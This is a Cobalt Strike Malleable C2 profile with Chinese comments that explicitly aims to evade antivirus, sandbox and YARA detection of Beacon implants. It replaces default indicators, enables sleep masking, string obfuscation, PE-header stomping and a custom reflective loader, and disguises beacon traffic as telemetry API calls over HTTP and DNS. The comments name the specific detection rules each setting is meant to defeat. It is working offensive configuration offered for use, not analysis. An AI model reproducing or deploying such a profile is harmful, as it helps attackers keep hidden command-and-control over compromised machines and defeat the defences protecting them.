#
# cs_dev :: csdev.profile  --  规避标准特征的自定义 Malleable C2 Profile
# ==========================================================================
# 目的: 消除 CS 默认 profile 的特征, 这些特征正是沙箱/Av 判定 "CobaltStrike"
#       家族的依据。
#
# 默认 profile 的命中点 (来自沙箱报告实测):
#   http-get  uri : /cx            (21 个标准 URI 池成员之一)
#   http-post uri : /submit.php
#   sleeptime     : 60000
#   watermark     : 987654321
#   spawnto_x64   : %windir%\sysnative\rundll32.exe
#
# 本 profile 全部替换为中性值, 使:
#   1) Yara 中针对默认 URI 组合的规则失效
#   2) 流量侧 "CobaltStrike C2 常用 URI" / "Stager URI" 判定失效
#   3) 内存配置提取结果不再是默认特征值
#
# 语法取值严格限定在 resources/default.profile 里出现过的可选项, 避免
# teamserver 因 profile 解析失败而无法启动。
#
# 用法: 客户端 -> Listeners -> 新建 HTTPS Listener 时在 profile 处选本文件
# ==========================================================================

# 心跳: 默认 60000 是标准特征, 改为带 jitter 的非整值
set sleeptime "37000";
set jitter    "35";

set sample_name "Kernel Telemetry Helper";

# ---- 免杀开关 (关键) ----------------------------------------------------
# 不配这几项, 放进 jar 的 UDRL / sleepmask 不会生效 —— CS 只在 profile 显式
# 要求时才使用它们, 否则走内置的默认反射加载器与明文内存。
#
# sleep_mask : Beacon 在 sleep 期间加密自身内存。未启用则内存中始终是明文,
#              会被 HKTL_CobaltStrike_Beacon_Strings / cobaltstrike_beacon_strings
#              等内存扫描规则直接命中。
set sleep_mask "true";
set obfuscate  "true";     # 混淆 Beacon 内部字符串
set smartinject "true";    # 注入时选择更合适的目标进程

# stage 段: allocator 决定 CS 采用哪一个 UDRL
#   CS 会查找 sleeve/BeaconLoader.<allocator>.x64.o, jar 内已部署:
#     HeapAlloc    -> BeaconLoader.HA.x64.o    6880 字节
#     VirtualAlloc -> BeaconLoader.VA.x64.o    7728 字节
#     MapViewOfFile-> BeaconLoader.MVF.x64.o   7504 字节
#   不配置 allocator 则回退到 CS 默认反射加载器, 会命中
#   Windows_Trojan_CobaltStrike_f0b627fc (beacon reflective loader) 与
#   CobaltStrike_MZ_Launcher (MZ header ReflectiveLoader launcher)。
stage {
    set allocator "HeapAlloc";
    set stomppe   "true";     # 抹除 stage 的 MZ/PE 头
    set obfuscate "true";
    set cleanup   "true";     # 加载完成后清理痕迹
    set userwx    "false";    # 不申请 RWX, 降低内存页特征
    set name      "npmproxy.dll";

    string "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW";
    string "dGVzdA==";
}

# ---- HTTP GET (Beacon 取指令) ------------------------------------------
# 关键: 不使用默认 21 个 URI 池中的任何一个
# 默认池为 /ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss
#           /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj
#           /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml
http-get {
    set uri "/api/v2/telemetry /assets/1x1.gif /static/vendor.js /health/ping";

    client {
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Language" "en-US,en;q=0.9";

        metadata {
            base64;
            header "X-Request-Id";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-store";

        output {
            print;
        }
    }
}

# ---- HTTP POST (Beacon 回传结果) ---------------------------------------
# 注意: default.profile 的 http-post 只用单个 URI, 此处保持一致避免解析歧义
http-post {
    set uri "/api/v2/events";

    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "Accept" "application/json, text/plain, */*";

        id {
            parameter "session";
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";

        output {
            print;
        }
    }
}

# ---- DNS Beacon --------------------------------------------------------
dns-beacon {
    set maxdns    "200";
    set beacon    "";
    set get_A     "n.";
    set get_AAAA  "v6.";
    set get_TXT   "t.";
    set put_metadata "m.";
    set put_output   "o.";
}
